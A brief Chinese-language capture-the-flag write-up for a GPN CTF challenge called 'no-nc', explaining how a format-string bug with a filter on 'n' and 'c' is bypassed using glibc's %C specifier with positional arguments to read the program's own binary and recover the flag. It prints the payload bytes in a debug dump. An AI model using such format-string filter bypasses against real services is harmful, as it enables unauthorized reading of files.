# 思路
- 格式化字符串，调试发现%71$为文件路径,加个\x00就为程序路径

## %C方法
%C 是 glibc 在支持 宽字符输出（wchar_t） 时的一个格式符（相当于 %lc，表示输出 wchar_t 类型的字符）。
它已经在 C99 标准中废弃，但在某些实现中依然存在（尤其是老版本的 glibc）
```
[DEBUG] Received 0x17 bytes:
    b'Give me a file to read\n'
[*] 00000000  25 38 24 43  25 39 24 43  00 00 00 00  00 00 00 00  │%8$C│%9$C│····│····│
    00000010  6e 00 00 00  00 00 00 00  63 00 00 00  00 00 00 00  │n···│····│c···│····│
    00000020
```
![](https://r2.20161023.xyz/pic/20250622092557881.png)

# 误区
题目中过滤了“n”，“c”， 以为过滤了字符串任意写，原来nc是程序名称，fuck


# getshell
```
[*] Closed connection to portshire-of-uncomfortably-powerful-hope.gpn23.ctf.kitctf.de port 443
(pip_venv) ➜  no-nc strings nc_remote |grep {
GPNCTF{up_aND_Down_a1L_arOUNd_GO3s_Th3_N_DIM3nsI0Na1_Circ1e_wtf_i5_7H1s_Fl4g}
(pip_venv) ➜  no-nc %8$C
```
![](https://r2.20161023.xyz/pic/20250622092238163.png)